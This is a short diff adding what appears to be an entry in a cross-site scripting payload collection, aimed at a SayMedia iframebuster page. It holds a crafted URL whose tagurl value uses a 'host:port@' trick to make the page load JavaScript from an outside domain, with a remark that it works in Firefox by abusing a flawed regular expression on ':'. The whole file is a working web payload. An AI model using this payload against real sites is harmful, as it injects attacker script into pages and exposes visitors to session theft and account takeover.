@@ -1,0 +1,3 @@
+/saymedia/iframebuster.html?tagurl=https://127.0.0.1:xxx@bgtian.life/xss.js
+
+Work on firefox. use the bad regexp on ":" to simulate the login:password stuff.
